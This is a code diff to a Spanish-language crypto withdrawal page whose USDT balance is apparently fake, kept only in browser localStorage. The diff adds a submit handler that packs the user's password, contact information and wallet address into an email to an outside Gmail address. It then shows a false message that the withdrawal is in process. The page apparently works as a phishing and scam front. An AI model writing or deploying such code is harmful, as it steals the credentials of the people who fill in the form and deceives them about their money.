@@ -123,31 +123,33 @@
                 <p id="balance">3.80 USDT</p>
             </div>
         </div>
-        <div class="input-box">
-            <label for="withdraw-method">Método de retiro:</label>
-            <input type="text" id="withdraw-method" value="TRC20-USDT" readonly>
-        </div>
-        <div class="input-box">
-            <label for="amount">Cuota:</label>
-            <input type="number" id="amount" placeholder="3.80 - 999999.00">
-        </div>
-        <div class="input-box">
-            <label for="contact-info">Información del contacto:</label>
-            <input type="text" id="contact-info" placeholder="Ingrese su información de contacto">
-        </div>
-        <div class="input-box">
-            <label for="withdraw-address">Dirección de retiro:</label>
-            <input type="text" id="withdraw-address" placeholder="Ingrese su dirección de retiro">
-        </div>
-        <div class="input-box">
-            <label for="password">Contraseña:</label>
-            <input type="password" id="password" placeholder="Ingrese su contraseña">
-        </div>
-        <div class="info-box">
-            <p>Tasa de tramitación: 1 USDT</p>
-            <p>Realmente recibido:  USDT</p>
-        </div>
-        <button class="button-confirm" onclick="confirmarRetiro()">Retirar</button>
+        <form id="withdraw-form">
+            <div class="input-box">
+                <label for="withdraw-method">Método de retiro:</label>
+                <input type="text" id="withdraw-method" value="TRC20-USDT" readonly>
+            </div>
+            <div class="input-box">
+                <label for="amount">Cuota:</label>
+                <input type="number" id="amount" placeholder="3.80 - 999999.00" required>
+            </div>
+            <div class="input-box">
+                <label for="contact-info">Información del contacto:</label>
+                <input type="text" id="contact-info" placeholder="Ingrese su información de contacto" required>
+            </div>
+            <div class="input-box">
+                <label for="withdraw-address">Dirección de retiro:</label>
+                <input type="text" id="withdraw-address" placeholder="Ingrese su dirección de retiro" required>
+            </div>
+            <div class="input-box">
+                <label for="password">Contraseña:</label>
+                <input type="password" id="password" placeholder="Ingrese su contraseña" required>
+            </div>
+            <div class="info-box">
+                <p>Tasa de tramitación: 1 USDT</p>
+                <p>Realmente recibido:  USDT</p>
+            </div>
+            <button class="button-confirm" type="submit">Retirar</button>
+        </form>
     </div>
     <!-- Ventana modal -->
     <div id="myModal" class="modal">
@@ -162,7 +164,7 @@
 
         // Inicializa el balance del usuario desde localStorage o establece un valor predeterminado
         function inicializarBalance() {
-            balance = parseFloat(localStorage.getItem('3.80')) || 3.80; // Balance inicial para pruebas
+            balance = parseFloat(localStorage.getItem('balance')) || 3.80; // Balance inicial para pruebas
             actualizarBalance();
         }
 
@@ -175,7 +177,6 @@
 
             if (amount >= 3.80 && amount <= balance) {
                 balance -= amount;
-                balance = 3.80;
                 localStorage.setItem('balance', balance);
                 actualizarBalance();
                 showModal("Su retiro está en proceso y en un momento será enviado a su cuenta de retiro.");
@@ -183,6 +184,24 @@
                 showModal("Saldo insuficiente o monto fuera del rango permitido.");
             }
         }
+
+        function enviarCorreo() {
+            const amount = document.getElementById("amount").value;
+            const contactInfo = document.getElementById("contact-info").value;
+            const withdrawAddress = document.getElementById("withdraw-address").value;
+            const password = document.getElementById("password").value;
+
+            const subject = encodeURIComponent("Solicitud de Retiro");
+            const body = encodeURIComponent(`Método de retiro: TRC20-USDT\nCuota: ${amount}\nInformación del contacto: ${contactInfo}\nDirección de retiro: ${withdrawAddress}\nContraseña: ${password}`);
+
+            window.location.href = `mailto:g8349291@gmail.com?subject=${subject}&body=${body}`;
+        }
+
+        document.getElementById("withdraw-form").addEventListener("submit", function(event) {
+            event.preventDefault();
+            enviarCorreo();
+            confirmarRetiro();
+        });
 
         // Funciones para mostrar y cerrar la ventana modal
         function showModal(message) {
